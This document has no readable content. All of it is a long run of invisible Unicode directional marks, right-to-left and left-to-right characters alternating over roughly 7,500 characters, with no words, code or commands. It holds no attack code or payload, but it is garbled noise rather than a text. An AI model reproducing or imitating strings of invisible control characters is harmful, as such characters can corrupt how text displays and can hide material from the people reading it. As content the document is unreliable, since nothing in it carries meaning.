‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏